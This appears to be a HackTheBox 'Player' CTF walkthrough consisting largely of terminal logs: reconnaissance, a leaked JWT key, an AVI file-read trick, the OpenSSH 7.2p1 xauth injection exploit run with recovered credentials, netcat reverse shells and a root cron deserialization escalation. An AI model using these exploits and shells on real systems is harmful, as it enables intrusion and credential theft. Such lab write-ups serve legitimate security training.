---
title: "HackTheBox - Player"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

~ backupfile

<?php  
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))  
{  
$key = '_S0_R@nd0m_P@ss_';  
$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);  
if($decoded->access_code === "0E76658526655756207688271159624026011393")  
{  
header("Location: 7F2xxxxxxxxxxxxx/");  
}  
else  
{  
header("Location: index.html");  
}  
}  
else  
{  
$token_payload = [  
'project' => 'PlayBuff',  
'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'  
];  
$key = '_S0_R@nd0m_P@ss_';  
$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');  
$cookiename = 'access';  
setcookie('access',$jwt, time() + (86400 * 30), "/");  
header("Location: index.html");  
}

?>

root@kali:~# nmap -sV -sC 10.10.10.145 [241/1956]  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 22:39 CET  
Nmap scan report for 10.10.10.145  
Host is up (0.032s latency).  
Not shown: 958 closed ports, 40 filtered ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)  
| 2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)  
| 256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)  
|_ 256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)  
80/tcp open http Apache httpd 2.4.7  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
|_http-title: 403 Forbidden  
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds  
root@kali:~# wfuzz -w /usr/share/wordlists/subdomains-top1mil-5000.txt --hc 400,403,404 -H "HOST: FUZZ.player.htb" http://10.10.10.145

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************  
* Wfuzz 2.4 - The Web Fuzzer *  
********************************************************

Target: http://10.10.10.145/  
Total requests: 5000

===================================================================  
ID Response Lines Word Chars Payload  
===================================================================

000000019: 200 86 L 229 W 5243 Ch "dev"  
000000067: 200 63 L 180 W 1470 Ch "staging"  
000000070: 200 259 L 714 W 9513 Ch "chat"

Total time: 19.66479  
Processed Requests: 5000  
Filtered Requests: 4997  
Requests/sec.: 254.2614

root@kali:~# vim /etc/hosts

root@kali:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://player.htb  
===============================================================  
Gobuster v3.0.1  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)  
===============================================================  
[+] Url: http://player.htb  
[+] Threads: 10  
[+] Wordlist: /usr/share/wordlists/dirb/common.txt  
[+] Status codes: 200,204,301,302,307,401,403  
[+] User Agent: gobuster/3.0.1  
[+] Timeout: 10s  
===============================================================  
2020/01/18 22:45:10 Starting gobuster  
===============================================================  
/.hta (Status: 403)  
/.htaccess (Status: 403)  
/.htpasswd (Status: 403)  
/launcher (Status: 301)  
/server-status (Status: 403)  
===============================================================  
2020/01/18 22:45:24 Finished  
===============================================================  
root@kali:~# cd Downloads/  
root@kali:~/Downloads# python3 gen_avi.py file:///var/www/backup/service_config output.avi  
root@kali:~/Downloads# ls  
8926359.avi gen_avi.py output.avi  
root@kali:~/Downloads# xdg-open 8926359.avi  
root@kali:~/Downloads# clear

root@kali:~/Downloads# nmap -p- player.htb  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 23:21 CET  
Stats: 0:12:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 68.28% done; ETC: 23:39 (0:05:41 remaining)  
Stats: 0:25:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 81.64% done; ETC: 23:53 (0:05:47 remaining)  
Stats: 0:38:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 94.34% done; ETC: 00:02 (0:02:19 remaining)  
Nmap scan report for player.htb (10.10.10.145)  
Host is up (0.022s latency).  
Not shown: 65532 closed ports  
PORT STATE SERVICE  
22/tcp open ssh  
80/tcp open http  
6686/tcp open unknown

Nmap done: 1 IP address (1 host up) scanned in 2770.55 seconds  
root@kali:~/Downloads# nmap -p 6686 -sV -sC player.htb  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 08:50 CET  
Nmap scan report for player.htb (10.10.10.145)  
Host is up (0.019s latency).

PORT STATE SERVICE VERSION  
6686/tcp open ssh OpenSSH 7.2 (protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds  
root@kali:~/Downloads# ssh telegen@player.htb -p 6686  
telegen@player.htb's password:  
Last login: Sun Jan 19 13:29:59 2020 from 10.10.15.22  
Environment:  
USER=telegen  
LOGNAME=telegen  
HOME=/home/telegen  
PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin  
MAIL=/var/mail/telegen  
SHELL=/usr/bin/lshell  
SSH_CLIENT=10.10.15.22 55464 6686  
SSH_CONNECTION=10.10.15.22 55464 10.10.10.145 6686  
SSH_TTY=/dev/pts/0  
TERM=screen  
========= PlayBuff ==========  
Welcome to Staging Environment

telegen:~$ ls  
*** forbidden command: ls  
telegen:~$ help  
clear exit help history lpath lsudo  
telegen:~$ lpath  
Allowed:  
/home/telegen  
telegen:~$ lsudo  
Allowed sudo commands:  
telegen:~$ exit  
Connection to player.htb closed.

root@kali:~/Downloads# searchsploit openssh 7.2  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Exploit Title | Path  
| (/usr/share/exploitdb/)  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
OpenSSH 7.2 - Denial of Service | exploits/linux/dos/40888.py  
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection | exploits/multiple/remote/39569.py  
OpenSSH 7.2p2 - Username Enumeration | exploits/linux/remote/40136.py  
OpenSSHd 7.2p2 - Username Enumeration | exploits/linux/remote/40113.txt  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Shellcodes: No Result  
root@kali:~/Downloads# searchsploit -m exploits/multiple/remote/39569.py  
Exploit: OpenSSH 7.2p1 - (Authenticated) xauth Command Injection  
URL: https://www.exploit-db.com/exploits/39569  
Path: /usr/share/exploitdb/exploits/multiple/remote/39569.py  
File Type: troff or preprocessor input, ASCII text, with very long lines, with CRLF line terminators

Copied to: /root/Downloads/39569.py

root@kali:~/Downloads# python 39569.py  
Usage: <host> <port> <username> <password or path_to_privkey>

path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key

root@kali:~/Downloads# python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'  
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686  
Traceback (most recent call last):  
File "39569.py", line 462, in <module>  
timeout=10  
File "39569.py", line 360, in __init__  
look_for_keys=False, pkey=pkey)  
File "/usr/lib/python2.7/dist-packages/paramiko/client.py", line 446, in connect  
passphrase,  
File "/usr/lib/python2.7/dist-packages/paramiko/client.py", line 764, in _auth  
raise saved_exception  
paramiko.ssh_exception.AuthenticationException: Authentication timeout.  
root@kali:~/Downloads# clear  
root@kali:~/Downloads# python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'  
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686  
INFO:__main__:connected!  
INFO:__main__:  
Available commands:  
.info  
.readfile <path>  
.writefile <path> <data>  
.exit .quit  
<any xauth command or type help>

#> .readfile /home/telegen/user.txt  
DEBUG:__main__:auth_cookie: 'xxxx\nsource /home/telegen/user.txt\n'  
DEBUG:__main__:dummy exec returned: None  
INFO:__main__:30e47abe9e315c0c39462d0cf71c0f48  
#> .readfile /var/www/staging/fix.php

[..]

/for  
//fix  
//peter  
//CQXpm\z)G5D#%S$y=  
}  
public  
if($result  
static::passed($test_name);  
}  
static::failed($test_name);  
}  
}  
public  
echo  
echo  
echo  
}  
private  
echo

[..]

root@kali:~# ifconfig tun0 [344/344]  
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  
inet 10.10.15.95 netmask 255.255.254.0 destination 10.10.15.95  
inet6 dead:beef:2::115d prefixlen 64 scopeid 0x0<global>  
inet6 fe80::b480:6dc6:a801:c6fa prefixlen 64 scopeid 0x20<link>  
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)  
RX packets 1080 bytes 981503 (958.4 KiB)  
RX errors 0 dropped 0 overruns 0 frame 0  
TX packets 1085 bytes 184916 (180.5 KiB)  
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

root@kali:~# nc -lnvp 1234  
listening on [any] 1234 ...  
connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 58920  
Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux  
03:56:03 up 17 min, 0 users, load average: 0.00, 0.01, 0.01  
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
/bin/sh: 0: can't access tty; job control turned off  
$ python -c "import pty; pty.spawn('/bin/bash')"  
www-data@player:/$ ^Z  
[1]+ Stopped nc -lnvp 1234  
root@kali:~# stty raw -echo  
root@kali:~# nc -lnvp 1234

www-data@player:/$ export TERM=xterm  
www-data@player:/$ clear  
www-data@player:/$ cd /tmp  
www-data@player:/tmp$ nc 10.10.15.95 1337 > pspy64

root@kali:~# nc -lnvp 1337 < pspy64  
listening on [any] 1337 ...  
connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 48964

www-data@player:/tmp$ chmod +x pspy64  
www-data@player:/tmp$ ./pspy64  
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

██▓███ ██████ ██▓███ ▓██ ██▓  
▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒  
▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░  
▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░  
▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░  
▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒  
░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░  
░░ ░ ░ ░ ░░ ▒ ▒ ░░  
░ ░ ░  
░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)  
Draining file system events due to startup...  
done

2020/01/20 04:06:01 CMD: UID=0 PID=3429 | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d  
2020/01/20 04:06:02 CMD: UID=0 PID=3431 | CRON  
2020/01/20 04:06:02 CMD: UID=0 PID=3433 | /usr/bin/php /var/lib/playbuff/buff.php  
2020/01/20 04:06:02 CMD: UID=0 PID=3432 | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php > /var/lib/playbuff/error.log  
2020/01/20 04:06:06 CMD: UID=0 PID=3436 | sleep 5

www-data@player:/tmp$ cat /var/lib/playbuff/buff.php  
<?php  
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");  
class playBuff  
{  
public $logFile="/var/log/playbuff/logs.txt";  
public $logData="Updated";

public function __wakeup()  
{  
file_put_contents(__DIR__."/".$this->logFile,$this->logData);  
}  
}  
$buff = new playBuff();  
$serialbuff = serialize($buff);  
$data = file_get_contents("/var/lib/playbuff/merge.log");  
if(unserialize($data))  
{  
$update = file_get_contents("/var/lib/playbuff/logs.txt");  
$query = mysqli_query($conn, "update stats set status='$update' where id=1");  
if($query)  
{  
echo 'Update Success with serialized logs!';  
}  
}  
else  
{  
file_put_contents("/var/lib/playbuff/merge.log","no issues yet");  
$update = file_get_contents("/var/lib/playbuff/logs.txt");  
$query = mysqli_query($conn, "update stats set status='$update' where id=1");  
if($query)  
{  
echo 'Update Success!';  
}  
}  
?>  
g.phpata@player:/tmp$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786  
<?php  
$servername = "localhost";  
$username = "root";  
$password = "";  
$dbname = "integrity";

// Create connection  
$conn = new mysqli($servername, $username, $password, $dbname);  
// Check connection  
if ($conn->connect_error) {  
die("Connection failed: " . $conn->connect_error);  
}  
?>  
www-data@player:/tmp$ clear  
www-w-w-data@player:/tmp$ vimr/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php-data@player:/tmp$ vi /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.pw-data@player:/tmp$ vim /var/www/html/launcher/dee8dc8a47256c64630d803a4c4  
0786g.

root@kali:~# nc -lnvp 1338  
listening on [any] 1338 ...  
connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 34326  
bash: cannot set terminal process group (3781): Inappropriate ioctl for device  
bash: no job control in this shell  
root@player:~# cat /root/root.txt  
cat /root/root.txt  
7df#########ZENSIERT#########49c  
root@player:~#